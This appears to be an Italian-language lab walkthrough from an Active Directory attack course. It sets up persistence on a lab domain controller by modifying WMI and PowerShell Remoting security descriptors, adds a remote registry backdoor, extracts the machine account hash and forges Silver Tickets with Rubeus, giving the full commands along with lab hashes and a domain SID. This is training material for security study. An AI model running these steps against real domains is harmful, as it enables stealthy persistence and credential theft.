# LEARNING OBJECTIVE13

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

1. Modify security descriptors on dcorp-dc to get access using PowerShell\
   remoting and WMI without requiring administrator access.
2. Retrieve machine account hash from dcorp-dc without using\
   administrator access and use that to execute a Silver Ticket attack to get\
   code execution with WMI.

### SVOLGIMENTO

1.Una volta ottenuti i privilegi amministrativi su un computer, è possibile modificare i descrittori di sicurezza dei servizi per accedere ai servizi senza privilegi amministrativi. Il comando riportato di seguito (da eseguire come amministratore di dominio) modifica i descrittori di sicurezza host per WMI sul DC per consentire a studentx di accedere a WMI:

Spawniamo un prompt da Domain Admin

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

<figure><img src="../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

Nel nuovo prompt, usiamo InviShell e importiamo Race.ps1 per modificare l'ACL relativa al RemoteWMI

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```powershell
. C:\AD\Tools\RACE.ps1
```

```powershell
 Set-RemoteWMI -SamAccountName student460 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

<figure><img src="../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

Adesso aprendo un prompt Powershell come utente student460 possiamo eseguire comandi con WMI sul DC

```powershell
gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```

<figure><img src="../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Una modifica simile può essere apportata alla configurazione di PowerShell Remoting. (In rari casi, è possibile che si verifichi un errore I/O durante l'utilizzo del comando riportato di seguito; si prega di ignorarlo). Si prega di notare che questa operazione è instabile a causa di alcune patch applicate nell'agosto 2020:

```powershell
. C:\AD\Tools\RACE.ps1
```

```
Set-RemotePSRemoting -SamAccountName student460 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```

<figure><img src="../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

Ora possiamo eseguire comandi utilizzando PowerShell remoting sul DC senza privilegi DA, aprendo un semplice prompt Powershell:

```powershell
Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

<figure><img src="../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

2.Per recuperare l'hash dell'account macchina richiesto (dcorp-dc) senza DA privileges, occorre innanzitutto modificare le autorizzazioni sul DC.

Eseguire il comando seguente come DA (usare Rubeus con svcadmin e spawnare un prompt da DA come fatto nel punto1:

```powershell
. C:\AD\Tools\RACE.ps1
```

```powershell
 Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student460 -Verbose
```

<figure><img src="../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

Adesso con un semplice prompt Powershell possiamo recuperare l'hash dell'account host di dcorp-dc

```powershell
. C:\AD\Tools\Race.ps1
```

```powershell
 Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```

<figure><img src="../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

È possibile utilizzare l'hash dell'account macchina per creare Silver Ticket. Creare Silver Ticket per HOST e RPCSS utilizzando l'hash dell'account macchina per eseguire query WMI, apriamo un prompt run as administrator:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:922dbee7f8548b8a2dc279d0c47d8d1c /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt

Silver-Ticket HTTP
```

<figure><img src="../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:922dbee7f8548b8a2dc279d0c47d8d1c /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
Silver-Ticket RPCSS
```

<figure><img src="../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

Dallo stesso prompt eseguiamo Invishell ed eseguiamo un comando WMI sul DC come student460

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```powershell
gwmi -Class win32_operatingsystem -ComputerName dcorp-dc
```

<figure><img src="../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>
